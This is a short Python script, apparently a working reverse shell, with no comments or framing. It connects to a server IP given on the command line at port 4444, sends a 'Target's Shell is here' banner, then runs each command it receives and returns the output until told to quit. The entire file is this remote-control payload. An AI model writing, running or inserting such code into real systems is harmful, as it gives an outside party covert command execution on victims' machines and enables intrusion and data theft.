import sys 
import socket
from subprocess import Popen, PIPE

SERVER_PORT = 4444
SERVER_IP = sys.argv[1]
address = (SERVER_IP, SERVER_PORT)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(address)
s.send('[<<] Target\'s Shell is here'.encode())
cmd = s.recv(2048).decode()

while cmd != 'quit':
    process = Popen(cmd.split(' '), stdout=PIPE, stderr=PIPE)
    res, err = process.communicate()
    s.send(res)
    cmd = s.recv(2048).decode()

s.close()
